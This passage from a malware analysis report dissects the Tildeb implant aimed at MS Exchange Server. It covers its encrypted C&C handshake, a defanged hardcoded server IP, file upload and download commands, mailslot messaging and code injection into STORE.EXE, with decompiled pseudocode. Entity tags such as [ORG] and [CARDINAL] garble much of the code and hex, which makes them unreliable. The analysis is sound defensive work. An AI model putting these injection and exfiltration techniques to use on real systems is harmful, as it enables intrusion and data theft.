connection over the default port [DATE] 1608 . The socket is created to listen on all network interfaces , expecting to receive the exact check - in message OK*3213 * from the server . If the message does not match , the implant bails out . Figure [CARDINAL] 3 shows how the abovementioned steps are carried out in the code . Worth noting is the use of different classes , [ORG] CAsyncSocket and [ORG] CSocket , and the function listen ( ) from the library Ws2_32.dll . It is not clear why these APIs were mixed together to create a socket . Additionally , the return value of the API GetLastError ( ) is never checked for.long lEvent = ( FD_READ | FD_WRITE | FD_OOB | FD_ACCEPT | [ORG] FD_CONNECT | [ORG] FD_CLOSE ) ; [GPE] CAsyncSocket::Create(&CSocket_success , 0 , lEvent , 0 ) ; if ( ! CAsyncSocket::Connect(&CSocket_success , ip_addr_ar , dst_port_tcp ) ) { GetLastError ( ) ; // the return value is never checked ! CSocket::Close ( & CSocket_success ) ; if ( ! CreateThread(0 , 0 , cleanup_thread , [DATE] 0 , [CARDINAL] 0 , & ThreadId ) ) { CAsyncSocket::Create(&CSocket_listening , nSocketPort , SOCK_STREAM , lEvent , 0 ) ; listen(s , [CARDINAL] 5 ) ; // backlog = max of [CARDINAL] 5 outstanding connections CSocket::Accept(&CSocket_listening , [DATE] 0 , 0 ) ; Dest[0 ] = [CARDINAL] 0 ; CSocket::Receive(&CSocket_listening , [GPE] Dest , [DATE] 1024 , 0 ) ; if ( strcmp(Dest , aOk3213 ) ) // \" OK*3213 * \" SetPriorityClass(h_process , NORMAL_PRIORITY_CLASS ) ; [PERSON] setsockopt(notcreated_socket , IPPROTO_TCP , TCP_NODELAY , & nd_disable , [CARDINAL] 4 ) ; [ORG] CSocket::Send(&CSocket_success , [ORG] aSuccess , [DATE] 8 , 0 ) ; // \" Success\\x00 \" if ( ! [ORG] ThreadId & & ! CreateThread(0 , 0 , cleanup_thread , [DATE] 0 , [CARDINAL] 0 , & ThreadId ) ) { return -1 ; } Figure [CARDINAL] 3 : Sockets creation - hex - rays decompiler pseudocodeOnce the socket is successfully created and the [ORDINAL] first plaintext packet is sent or received , [ORG] Tildeb starts to set up a secure communication channel with the server such that all subsequent traffic is encrypted . To establish such a connection , it [ORDINAL] first expects to receive a buffer of [CARDINAL] 132 bytes , which we \u2019ve referred to as R_A. Then , it creates a buffer of [CARDINAL] 132 bytes with pseudorandom data , which we \u2019ve referred to as S_A. The [ORDINAL] first [CARDINAL] 128 bytes are the result of SHA-1 ( modified version ) hashing of different elements from the system such as cursor position , thread ID , thread times , process ID , memory status , system time , and performance counter among others . The [CARDINAL] 128 bytes are then compared against a hardcoded blob of [CARDINAL] 132 bytes . If the last dword value is greater than the last dword value of the hardcoded blob , the buffer is regenerated . This comparison is done backward ( from last to [ORDINAL] first ) by comparing a dword value from each buffer at a time until the condition fails . We \u2019ll refer to this comparison as [GPE] cmp_dw_bckwrd . The last 4 bytes ( offsets : [ 0x88 - 0x83 ] ) are always [CARDINAL] zero ( this buffer of [CARDINAL] 132 bytes is [ORDINAL] first initialized to zero).5Hardcoded blob is : [CARDINAL] 13 E3 B7 E3 A0 C9 D9 CE 43 70 A4 54 CE 8D [CARDINAL] 7E C9 [CARDINAL] B5 B7 FB 86 E1 12 A9 B4 [CARDINAL] 49 A4 96 97 E4 38 DC [CARDINAL] 2E [CARDINAL] 2D [CARDINAL] 1E F1 C9 [CARDINAL] 80 [CARDINAL] C5 [CARDINAL] 8F [CARDINAL] 2A 36 B3 [CARDINAL] 07 [CARDINAL] E3 6B [CARDINAL] 85 DB [CARDINAL] 2E [CARDINAL] 5D [CARDINAL] 7E [ORG] B8 [CARDINAL] 39 [PRODUCT] E7 [PRODUCT] C9 [CARDINAL] 4F DB [CARDINAL] 04 [CARDINAL] 14 F3 C2 70 D7 4C [CARDINAL] 37 C7 [DATE] 54 [DATE] 86 55 [CARDINAL] F7 8A [CARDINAL] 31 [ORG] B8 [CARDINAL] 04 [CARDINAL] 39 [ORG] 7D [CARDINAL] B5 F0 14 B8 F8 [CARDINAL] C1 [CARDINAL] 8A 4F 3B [CARDINAL] A8 89 64 CF 10 82 5C 35 8D 06 16 [CARDINAL] 81 B5 91 [CARDINAL] 3A 17 E7 BC 1E 5B 44 [PRODUCT] C9 [PRODUCT] C6 [PRODUCT] D5 [PRODUCT] 40 [PRODUCT] EB [CARDINAL] 74 [PRODUCT] D7 [PRODUCT] D6 2D B1 [CARDINAL] 4F CE [CARDINAL] 29 [CARDINAL] 00 A7 70 80 45 AB 7E [ORG] 8F [ORG] CF [ORG] 2D 00 00 00 00Note that all of the blobs of bytes are stored as strings in the code and in the reverse order of what \u2019s shown . Before use , each of them is converted to hex and then the bytes \u2019 order is reversed to look like the aforementioned blob . The [DATE] S_A buffer is further modified , and similar comparisons are done on it ( with the fixed blob [CARDINAL] 02 00 00 00 00 ) , and then sent to the server . The [ORG] R_A buffer is then modified using the [CARDINAL] 128 pseudorandom bytes generated earlier for [DATE] S_A and the blob [CARDINAL] 02 00 00 00 00.Later , the implant generates a seed key of [CARDINAL] 256 bytes ( which we \u2019ve referred to as Se_Ke ) , considering the modified [NORP] R_A buffer . It then receives a buffer of [CARDINAL] 132 bytes from the server , which we \u2019ve referred to as R_B. This buffer will then be modified with the hardcoded blob [CARDINAL] 4B A0 00 00 00 00 00 00 using the hardcoded \u201c random \u201d blob of [CARDINAL] 132 bytes:81 [CARDINAL] A6 B8 DB F3 55 4C B7 90 7A D9 FF [CARDINAL] 5C [CARDINAL] 4A ED C4 F8 [DATE] 94 [DATE] 5B [DATE] EE [CARDINAL] 0A [CARDINAL] 32 [ORG] DE A4 [CARDINAL] 8B C3 40 60 BE [CARDINAL] 95 C7 67 43 AB [CARDINAL] 19 E3 23 DE EA 8E 92 24 4D ED 3C [CARDINAL] 05 FA C3 9E 4F 86 [CARDINAL] 2F B7 [ORG] AF 0B AD E6 D7 67 82 44 A7 [CARDINAL] 7B [CARDINAL] 10 0C [ORG] EA [ORG] AB F5 [CARDINAL] 88 9D E8 45 E3 DC 72 [CARDINAL] 19 F6 75 19 07 50 0E [CARDINAL] 91 E4 05 CC 1D 11 [ORG] FC CC [DATE] 75 [DATE] 64 DA [CARDINAL] 10 A2 [DATE] 15 [DATE] 31 3D 1D 85 49 EB D2 74 88 7F [CARDINAL] 20 [CARDINAL] 90 0E 86 58 7F [CARDINAL] 75 13 38 35 00 [CARDINAL] 80 D2 20 73 0C 47 [CARDINAL] 8F BD AD C9 E2 00 00 00 00Finally and for verification , it compares both the [DATE] S_A and R_B buffers . Both have to match to send the status message [ORG] Success\\x00 ( this is different from the check - in request described earlier ) . Otherwise , it sends the message [LOC] Error\\x00 to the server . In case the comparison fails , the implant bails out . These messages are sent XOR - encrypted with every key byte being unique . The generated key is dependent on the seed key [GPE] Se_Ke . Subsequently , all further communications are XOR - encrypted . In a nutshell , this exchange of packets demonstrates the sharing of what looks like session keys that are client - server dependent . Each established TCP session with the server would generate a different set of encryption and decryption keys . Nevertheless , since only the XOR binary operator is used for encryption and decryption , having prior knowledge on the nature of the data being exfiltrated or received makes it possible to decrypt it . Figure [CARDINAL] 4 shows the code responsible for sending encrypted traffic . Every buffer to be sent is [ORDINAL] first allocated on the heap , encrypted , sent , and then freed from memory . From a forensics standpoint , and memory analysis in particular , this makes it hard to collect such evidentiary data . However , this is not the case when receiving data from the server . It is rather decrypted and consumed without any attempt to clear it from the memory or disk.6 { result = VirtualAlloc(0,dwSize , [PERSON] MEM_COMMIT , PAGE_READWRITE ) ; qmemcpy(result , data , dwSize ) ; for ( i = [CARDINAL] 0 ; i < dwSize ; + + i ) { buffer[i ] [DATE] ^= get_key(Se_Ke ) ; } bytes_sent = CSocket::Send(hSocket , buffer , dwSize , flag ) ; VirtualFree(buffer , 0 , MEM_RELEASE ) ; } Figure [CARDINAL] 4 : send function - encrypted channel \u2013 hex - rays decompiler pseudocodeAfter setting up a secure communication channel , [ORG] Tildeb is ready to receive control commands to perform various malicious activities on the infected system . Figure [CARDINAL] 5 illustrates the process of establishing a successful connection with the remote server.7Figure [CARDINAL] 6 : How Tildeb establishes a successful [ORG] connection8The [ORG] Hardcoded [ORG] IP [ORG] Address 137[.]140[.]55[.]211 There is an interesting blunder in the way the [ORG] IP address is hardcoded . It ends with [CARDINAL] 3 - space characters the [ORG] IP address on specific versions of Windows OS works correctly but fails on others . There is a technical justification for this behavior . As noted earlier , the implant uses the [ORG] MFC library for all network communications . To connect to the [ORG] IP address , it uses the MFC API CAsyncSocket::Connect ( ) located in the library mfc42.dll . Since [ORG] MFC classes are just [NORP] C++ wrappers for Windows APIs , the actual implementation of this function is in the [PRODUCT] Windows ntdll.dll library on , for example , [PERSON] Windows [PERSON] XP(SP3 ) and other operating systems . The figure below shows the steps taken to reach the core implementation ( for mfc42.dll , [ORG] File [ORG] Version : 6.02.8073.0):{mfc42.dll}{ws2_32.dll}{ntdll.dll}\u2022CAsyncSocket::Connect()\u2022inet_addr()\u2022RtlIpv4StringToAddressA()CSocket::ConnectHelper()_{mfc42.dll}->CAsyncSocket::ConnectHelper()_{mfc42.dll}->connect()_{WSOCK32.dll}Figure [CARDINAL] 6 : CAsyncSocket::Connect ( ) API implementation sequence ( Windows XP ; [CARDINAL] 32 - bit)Figure [CARDINAL] 6 shows the functions that get called in an attempt to convert \u201c a string containing an [ORG] IPv4 address dotted - decimal address into a proper address for the in_addr structure \u201d . And as per [ORG] Microsoft [ORG] Developer Network \u2019s ( [ORG] MSDN ) documentation on the inet_addr ( ) function , passing \" \" ( a space ) to the inet_addr function will return [CARDINAL] zero . In actuality , the inet_addr ( ) function [ORDINAL] first checks if the [ORDINAL] first character in the passed string is a space character . If so , it checks if the next character in the string is the null terminated character \\x00 . If not , it proceeds to call the ntdll function RtlIpv4StringToAddressA ( ) , which is responsible for parsing , sanitizing , and converting the passed string into a proper binary [ORG] IPv4 address in network order . RtlIpv4StringToAddressA ( ) checks if every character is in American Standard Code for Information Interchange ( [ORG] ASCII ) or a digit . If it is in [ORG] ASCII , it checks if it is the character \\x2e ( . ) . After a successful conversion , the [WORK_OF_ART] Terminator parameter , which \u201c receives a pointer to the character that terminated the converted string , \u201d returns the space character as the terminating character . The code that follows in the function inet_addr ( ) then checks whether it is the null \\x00 terminating character . If not , it checks whether it is an [ORG] ASCII character ; if not , it fails . Otherwise , it continues to check if it is a space character . If so , it returns successfully ; otherwise , the function fails . It is important to note that what contributes to the successful conversion in this case is the fact that the Strict parameter of RtlIpv4StringToAddressA ( ) is set to false . It would n\u2019t make sense otherwise in the context of [ORG] Tildeb \u2019s operation . MSDN defines the [GPE] Strict parameter as follows : \u201c A value that indicates whether the string must be an [ORG] IPv4 address represented in strict [CARDINAL] four - part dotted - decimal notation . If this parameter is TRUE , the string must be dotted - decimal with [CARDINAL] four parts . If this parameter is FALSE , any of [CARDINAL] four possible forms are allowed , with decimal , octal , or hexadecimal notation . \u201dThis also works with Windows NT 4.0 . The function inet_addr ( ) has the actual similar implementation of RtlIpv4StringToAddressA ( ) , but is less sophisticated.9For [PRODUCT] Windows [PRODUCT] XP , [ORG] the [ORG] MFC \u2019s Connect ( ) function works properly . However , this is not the case for Windows 7 . Figure [CARDINAL] 7 shows the chain of function calls it takes to actually connect to the [ORG] IP / domain address ( this is for mfc42.dll , [ORG] File [ORG] Version : 6.6.8063.0 ) . Not every visited function / API is shown.1 \u2022 { mfc42.dll}CAsyncSocket::Connect()2 \u2022 { ws2_32.dll}getaddrinfo()3 \u2022 { ws2_32.dll}GetAddrInfoW()4 \u2022 { ws2_32.dll}5 \u2022 { ntdll.dll}6 \u2022 { ws2_32.dll}7 \u2022 { ws2_32.dll } \u2022 ConvertIp6StringToAddress()RtlIpv6StringToAddressExW()GetIp4Address ( ) - > RtlIpv4StringToAddressW()LookupAddressForName()Figure [CARDINAL] 7 : CAsyncSocket::Connect ( ) API implementation sequence ( Windows 7 ; [CARDINAL] 32 - bit)As shown in Figure [CARDINAL] 7 , the chain of calls is different from that of Windows XP , as the file version of the [ORG] MFC library file is different as well . The getaddrinfo ( ) function is more sophisticated at accounting for different scenarios and more . The code within the function GetIp4Address ( ) that \u2019s responsible for checking the [ORG] Terminator \u2019s parameter value is notable . After successfully calling the function RtlIpv4StringToAddressW ( ) , GetIp4Address ( ) checks the [WORK_OF_ART] Terminator value if it is the null character \\x00 and only this character . If so , the function returns [CARDINAL] 1 ( success ) . If it is anything other than \\x00 , the function fails , which is the case in this implant , that is , \\x20 . In this case , the setting of the Strict parameter does n\u2019t matter even if it 's set to true . [ORG] Control [ORG] Commands The core of [ORG] Tildeb \u2019s functionality lies in each of the control commands it supports . After establishing a secure connection with the [ORG] C&C server , it goes into an infinite loop waiting to receive control commands . The receive function expects a buffer with a maximum length of [CARDINAL] 4194304 bytes . If no bytes are received from the server , it sets the flag wayout_flag . This leads to exiting the infinite loop , starting the cleanup process , and then eventually terminating itself . Tildeb supports a plethora of control commands , all in binary format . All communications are encrypted . There are also status messages that Tildeb sends to the server upon attempting to complete a given task / command . For example , when it receives a control command , or when attempting to get a handle to a file / mailslot , it sends the message .\\x00 ( a dot followed by the null terminating character ) to the server after it successfully completes any of them . In case it fails , it sends the message Error\\x00.10Other analogous messages are sent to the server as well . The implant uses specific error codes represented as decimal values that it communicates back to the server upon failing to execute some fine- grained operations , and in particular while attempting to inject code into any of the [ORG] Exchange [ORG] Server processes . Furthermore , it sends the message ? \\x00 ( a question mark ) to the server if it receives an unrecognizable control command . The following is a detailed description of each of the commands ( in no particular order):\uf0b7 0x403 : Deletes a file on the system using the DeleteFileA [DATE] API.\uf0b7 [DATE] 0x500 : Sends the word value [CARDINAL] 0x2e00 to the server . It expects to receive a buffer of [CARDINAL] 4 bytes , and if it fails ( that is , no bytes were received ) , it sets the flag wayout_flag to [CARDINAL] 1 . Otherwise , it sends back the same 4 bytes it received from the server . This command functions as a ping - pong check , ensuring that the connection with the server is healthy.\uf0b7 0x1000 : Sets the flag wayout_flag to [CARDINAL] 1 for implant termination , and then sends the messageOk\\x00 to the server.\uf0b7 0x401 : Uploads a file to the server using C - runtime functions . It works by [ORDINAL] first getting the filenamefrom the server , retrieving the size of the file on the system , and then sending it to the server . It then expects to receive data from the server . If the [ORDINAL] first byte in the payload is 0x2e , it uploads the file in question to the server ( [CARDINAL] 0x200 elements of size , [CARDINAL] 1 byte at a time ) , until the end - of - file is reached . If it is unable to get a handle to the file , it sends the dword value 0x00000000 ( indicating the size ) to the server.\uf0b7 0x400 : Gets a list of files and folders in a given directory including current date and time , hostname , and files names with their last changed / modified attributes among others . It is saved to the disk in a temporary file , uploaded to the server , and then deleted . The upload function logic is the same as in control command 0x401 . However , the difference is that this one uses Windows APIs instead of C - runtime functions . The following is an example of the temporary file \u2019s content : Collected on < hostname > , Sat Nov 24 21:37:16 [DATE] 2018 . Listing directory C:\\interpol\\ * . * Sat Nov 24 21:35:09 [DATE] 2018 < DIR > . Sat Nov 24 21:35:09 [DATE] 2018 < DIR > Sun Jan 15 22:40:04 [DATE] 2012 [DATE] 1574 john_galt.pem [PERSON] Sun [PERSON] Jul 22 [TIME] 23:25:58 [DATE] 2012 < DIR > cia [DATE] Sat [DATE] Feb [DATE] 25 23:43:54 2012 6102 eula.txt [PERSON] Sun [PERSON] Jul 22 23:25:54 [DATE] 2012 < DIR > fbi Sun Jul 22 [TIME] 23:52:42 [DATE] 2012 3249 us.cfg Tue Jul 17 05:32:14 [CARDINAL] 2012 [DATE] 1002496 ru.exe Sun Jun [CARDINAL] 12 22:09:18 [DATE] 2011 [DATE] 2206720 cn.dllIn terms of how the temporary file is created , it [ORDINAL] first attempts to get the path to the installed [PRODUCT] MS [PRODUCT] ExchangeServer [PRODUCT] Mailbox from the registry . This is done by querying the Value of the [ORG] Working [ORG] Directory registry value name located under [LAW] the [LAW] Registry [LAW] Key : [LAW] HKLM , [ORG] SubKey , System\\CurrentControlSet\\Services\\MSExchangeIS\\ParametersSystem . The value of the parameter [ORG] Working [ORG] Directory holds the path to [PRODUCT] MS [PRODUCT] ExchangeServer [PRODUCT] Mailbox . If successful , it creates a temporary file in the said directory / path under the name tmp < uuuu>.tmp ( < uuuu > is an unsigned integer based on the current system time ) . Otherwise , it creates the file in the current11user \u2019s temporary folder under the same name . The created file is meant for writing , with temporary storage and sequential scan.\uf0b7 0x380 : [ORG] Sets [ORG] MS [ORG] Exchange \u201c [WORK_OF_ART] Background [WORK_OF_ART] Cleanup \u201d [WORK_OF_ART] Registry [WORK_OF_ART] Value with a value received from theserver , then sends out the old value . The said value is located under [LAW] the [LAW] Registry [LAW] Key [LAW] HKLM , SubKey : System\\CurrentControlSet\\Services\\MSExchangeIS\\ParametersPrivate . The background cleanup process is responsible for recovering empty space used by attachments , deleted folders , and messages . The Registry ValueName Background Cleanup value ( in milliseconds ) controls at which rate this process \u2019 task runs.\uf0b7 0x20 : The primary function of this control command follows several steps:1 . 2.It attempts to create a temporary file just as in control command 0x400 . It checks if a conditional flag is set to true , which it initially is . Then , it concatenates the path it retrieved in the [ORDINAL] first step with the server response value . For example , the path might look like % temp%\\<server_response>.2.1 It copies the final path derived in the [ORDINAL] second step into a global variable , which we \u2019ve referred to as fname_s . This variable will be passed into the code injection function.2.2 The conditional flag is set to [CARDINAL] 0 . Thus , this flag is meant to be set onlyonce during the implant \u2019s runtime life.2.3 If the conditional flag is not set , it would only concatenate the path itretrieved in the [ORDINAL] first step with the server response value.3.4.5.It downloads data from the server and saves it into the file ( as binary ) created in the [ORDINAL] first step . The downloaded file is expected to be a cabinet - compressed ( .cab ) file . It creates a process of the Windows expand utility for decompressing the file downloaded in the [ORDINAL] second step under a file name received from the server in the same directory of the created temporary file . If process creation ( step [CARDINAL] 4 ) is successful , it deletes the temporary file from the system . Otherwise , it sets the wayout_flag flag to [CARDINAL] 1 and deletes the temporary file . The rest of the control commands deals mainly with interprocess communications ( [ORG] IPC ) using Windows \u2019 mailslots mechanism as well as code injection into specific [ORG] MS [ORG] Exchange [ORG] Server processes . As detailed below , the implant establishes [CARDINAL] two - way communication using [CARDINAL] two mailslots . The mailslot it creates or the one it reads from are not referenced in any of the other tools and utilities in the leak . Therefore , it is unknown what the other process is supposed to do , or how it is supposed to run as a process or as a standalone or child process . The following are the [CARDINAL] two mailslots referenced in the implant : [PERSON] Mailslot name \\\\.\\mailslot\\c12345\\\\.\\mailslot\\c54321Description [ORG] Tildeb is the client process . Created by another process . Tildeb writes to it . Tildeb is the server process . Created by Tildeb . It reads from it . Mailslots communications are carried over using specific format messages , unique per control command . However , the general layout has the following structure : [ORG] Format [ORG] Message [ORG] Populated ' [ORG] % ld [ORG] % x',0Ah ' % ld % ls ' , 0'6553 0x400000',0Ah ' < control command > < server_response_x > < # type of info . > < \u2026 > ' 12The values [PRODUCT] 6553 and 0x400000 are hardcoded in the binary . The < control command > value is either hardcoded as per referenced control command or populated dynamically . < server_response_x > is data received from the [ORG] C&C server . There could be multiple receive requests from the server , which will be concatenated with the previous one . The [ORDINAL] second line of the format message is unique to each command . Judging by the mailslot name form , the other processes that use those [CARDINAL] two mailslots has to reside on the same host of [ORG] Tildeb \u2019s process.\uf0b7 [DATE] 0x300:1 . The format message has the following structure : [ORG] Format [ORG] Message ' [ORG] % ld [ORG] % ls ' , [CARDINAL] 0Populated'768 < server_response_a > < server_response_b>'Both values under < server_response_a > and < server_response_b > are received in [CARDINAL] two separate responses from the server . Based on the structure of the code , the value of < server_response_b > could be any of the following : pub.edb , priv.edb , or [ORG] dir.edb.2 . For [CARDINAL] one - way interprocess communications ( [ORG] IPC ) , it creates a thread responsible forcontinuously attempting to write the formatted message to an already created mailslot ( under the name \\\\.\\mailslot\\c12345 ) until successfully done so . The said mailslot is never created by [ORG] Tildeb \u2019s itself . It is unknown what the other process is that might be on the system or on the infected network that created this mailslot . It creates a mailslot under the name [PERSON] \\\\.\\mailslot\\c54321 ( the numbers [DATE] 54321 are in reverse order of the mailslot referenced in the [ORDINAL] first step ) , for a maximum size of [CARDINAL] 4194304 bytes and a time - out value of [CARDINAL] 30 seconds.3.4 . Based on the last server response , it decides which process of MS Exchange Server toinject code into : Server Response Process Name < if no match > STORE.EXE STORE.EXEBased on the server response , it injects code into the respective process . If the server responded with the string dir.edb and after successful code injection , it executes the code in the [ORDINAL] fifth step.5.6 . [CARDINAL] 7.It receives data from the server and reads from the mailslot [GPE] \\\\.\\mailslot\\c54321 into a buffer of [DATE] 1024 bytes . If the [ORDINAL] first byte from the server response is \\x2e , it attempts to upload the buffer \u2019s content to the server using the same , exact upload function referenced in the control command 0x400 . However , the upload function will fail since it expects a handle to the file to be uploaded . However , [ORG] Tildeb passes the address of the buffer instead . It closes the handle of the mailslot [GPE] \\\\.\\mailslot\\c54321 and sets its value to [CARDINAL] zero . It attempts to delete the buffer using the Windows API DeleteFileA. It commits the same mistake , since it is passing the address of the buffer and not a handle to a file.13Below is a brief description of some of the referenced file names and processes of [ORG] MS [ORG] Exchange [ORG] Server in this control command:\uf0b7 The [ORG] EDB extension is \" [WORK_OF_ART] Exchange [WORK_OF_ART] Information [WORK_OF_ART] Store [WORK_OF_ART] Database . \" \uf0b7 Prior to MS Exchange Server v5.5 , there were [CARDINAL] three key DB files , and each contained:1 . PRIV.EDB : private information store ( this is the actual mailbox content ) . [CARDINAL] 2 . PUB.EDB : public information store ( public folder ) . [CARDINAL] 3 . DIR.EDB : list / directory of users with mailboxes on the server.\uf0b7kmsmdb.edb : [ORG] Key [ORG] Management [ORG] Security [ORG] DB . This file is associated with MS Exchange Server [CARDINAL] 5.5 , and in particular the Key Management Server.\uf0b7 DSAMAIN.EXE : This is part of active directory management tools . It allows mounting ashadow copy snapshot or backup of [ORG] the [ORG] Active [ORG] Directory [ORG] DB file ntds.dit . Moreover , it allows browsing the data using standard admin tools such as [ORG] Active [ORG] Directory [ORG] Users [ORG] and [ORG] Computers ( ADUC ) and snap - in.\uf0b7 STORE.EXE : [ORG] Microsoft [ORG] Exchange [ORG] MDB [ORG] Store , responsible for enabling mail sessions openedby different clients.\uf0b7 0x290 OR 0x291 OR 0x292 : The format message has the following structure : ' % ld % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % 2x ' < control command > < s_r[0 ] > < s_r[1 ] > < s_r[2 ] > ' < s_r[3 ] > % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % 2x ' The bytes s_r[0 ] , s_r[1 ] , s_r[2 ] and s_r[3 ] are received from the server . The last 4 bytes are never set anywhere in the code . Then , it performs steps 2 - 7 ( code is injected into the STORE.EXE process ) similar to control command [CARDINAL] 0x300 , but it writes this control command \u2019s formatted string to the mailslot instead.\uf0b7 > = 0x285 : The format message has the following structure : [ORG] Format [ORG] Message ' [ORG] % ld [ORG] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % 2x ' ' 0x285 < s_r[0 ] > < s_r[1 ] > < s_r[2]>Populated < s_r[3 ] > % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [CARDINAL] 2x [CARDINAL] 1'The value 0x285 is hardcoded and it represents the actual control command . The bytes s_r[0 ] , s_r[1 ] , s_r[2 ] and s_r[3 ] are received from the server . The bytes highlighted above are never set anywhere in the code . If the control command is > 0x285 , formatted string is set to : [ORG] Format [ORG] Message ' [ORG] % ld [ORG] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % 2x ' ' < ( control command -1 ) > < s_r[0 ] > < s_r[1]>Populated < s_r[2 ] > < s_r[3 ] > % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [CARDINAL] 2x 0'The highlighted bytes are never set anywhere in the code . It performs steps 2 - 7 ( code is injected into STORE.EXE process ) similar to control command [CARDINAL] 0x300 , but it writes this control command \u2019s formatted string to the mailslot instead.\uf0b7 0x206 OR 0x207 : The format message has the following structure : [ORG] Format [ORG] Message ' [ORG] % ld [ORG] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % 2x ' ' < ( control command -2 ) > < s_r[0 ] > < s_r[1]>Populated < s_r[2 ] > < s_r[3 ] > % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % 2x'The bytes s_r[0 ] , s_r[1 ] , s_r[2 ] and s_r[3 ] are received from the server . The last 4 bytes are never set anywhere in the code . The [ORDINAL] first formatted string is populated independently of the second.14The [ORDINAL] second formatted string ( rhs ) is concatenated with the [ORDINAL] first [CARDINAL] one x ( condition value ) number of times in a for - loop that keeps on concatenating the [ORDINAL] second string to the [ORDINAL] first until the condition evaluates to false . The condition value is received from the server prior to the concatenation . Moreover , on every iteration inside the for - loop , the values of the [ORDINAL] second string s_r[]are populated with new data from the server . It then performs steps 2 - 7 ( code is injected into STORE.EXE process ) as that of control command [CARDINAL] 0x300 , but it writes this control command \u2019s formatted string to the mailslot instead.\uf0b7 0x290 OR 0x291 OR 0x292 : The format message has the following structure : ' % ld % ls ' Populated'<control command > < server_response > ' Then , concatenates < server_response_b > ' < control command > < server_response_a > < server_response_b > ' Then concatenate : ' % x % x ' ' < control command > < server_response_a > < server_response_b > % x < server_response_c>'The highlighted byte is never set anywhere in the code , and the [ORDINAL] second is received from the server ( maximum length of [CARDINAL] 8 bytes ) . It then performs steps 2 - 7 ( code is injected into STORE.EXE process ) similar to control command [CARDINAL] 0x300 , but it writes this control command \u2019s formatted string to the mailslot instead.\uf0b7 0x280 : It downloads a file from the server onto the infected system . The file is saved on diskunder a temporary file name . File path and name is retrieved and constructed in the same way as that of control command 0x400 . We 've referred to the full path and name of the downloaded file as dwldd_file . The format message has the following structure : [ORG] Format [ORG] Message ' [ORG] % ld [ORG] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % s ' ' < control command > < s_r[0 ] > < s_r[1 ] > < s_r[2]>Populated < s_r[3 ] > % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [PERCENT] 2x [PERCENT] % [CARDINAL] 2x < dwldd_file>'The highlighted bytes are never set anywhere in the code . It then performs steps 2 - 7 ( code is injected into STORE.EXE process ) similar to control command [CARDINAL] 0x300 , but it writes this control command \u2019s formatted string to the mailslot instead . After step [CARDINAL] 7 , it also deletes the download file dwldd_file.\uf0b7 0x281 : The same implementation of the control command 0x280.\uf0b7 0x204 : The same implementation of the control commands 0x290 , 0x291 , and 0x292.\uf0b7 0x203 : The same implementation of the control command 0x208 except that the < controlcommand > is hardcoded in the formatted string as [CARDINAL] 515 instead of being referenced . Additionally , the formatted string is different and has the following structure:'0x203 < server_response_a > < server_response_b>'\uf0b7 [CARDINAL] 0x202 : The same implementation of the control command [CARDINAL] 0x300 except that the < controlcommand > is hardcoded in the formatted string as [CARDINAL] 514 . For the [ORDINAL] fourth step , code is injected into [ORG] STORE.EXE [ORG] process.15\uf0b7 0x201 : The same implementation of the control command [CARDINAL] 0x300 , except that the < controlcommand > is hardcoded in the formatted string as [CARDINAL] 513 . For the [ORDINAL] fourth step , code is injected into the STORE.EXE process . Moreover , the formatted string is as follows ( nothing is concatenated with the server response):Format Message ' % ld ' Populated'513 ' Code Injection Function This function [ORDINAL] first checks if the available physical memory on the system and the maximum amount of memory the Tildeb process can commit is less than 33554432 bytes ( ~33.55 Mb ) . If so , then no attempt at code injection happens , as the following pseudocode snippet shows : [PERSON] GlobalMemoryStatus(&Buffer ) ; if ( Buffer.dwAvailPhys + Buffer.dwAvailPageFile < 33554432 ) { return -4 ; // [CARDINAL] error_code To get the process \u2019 ( \u2018 injectee \u2019 ) unique process ID , it uses the API NtQuerySystemInformation ( ) , passing it the [ORG] SystemInformationClass value from SystemProcessInformation . The targeted process is supposed to be running on the system already . It then attempts to get a handle to the process in question by requesting the following list of desired access rights ( using the [ORG] OpenProcess ( ) API ): PROCESS_CREATE_THREAD , PROCESS_VM_OPERATION , PROCESS_VM_READ , PROCESS_VM_WRITE , and PROCESS_QUERY_INFORMATION . If unsuccessful , it attempts to acquire them using either of [CARDINAL] two methods . Before attempting code injection , the implant compares the image base address of the module [PERSON] Kernel32.dll for the same process . [CARDINAL] One is retrieved via a pseudohandle to the process and the other via the actual process ID . If the base addresses do not match , code injection does not take place . It is unknown why the malware enforces such comparison , or under what scenario it is supposed to fail . The implant retrieves the image base address of the module [ORG] Kernel32.dll through either of the following [CARDINAL] two methods:1 . Using the API NtQuerySystemInformation ( ) , passing it the [ORG] SystemInformationClass value fromProcessBasicInformation , which returns the structure _ PROCESS_BASIC_INFORMATION . This is done by parsing the structures data members _ PEB.Ldr \uf0e0 _ PEB_LDR_DATA.InMemoryOrderModuleList \uf0e0 LDR_DATA_TABLE_ENTRY . DllBase.2 . Using the API NtQuerySystemInformation ( ) , passing it the [ORG] SystemInformationClass value 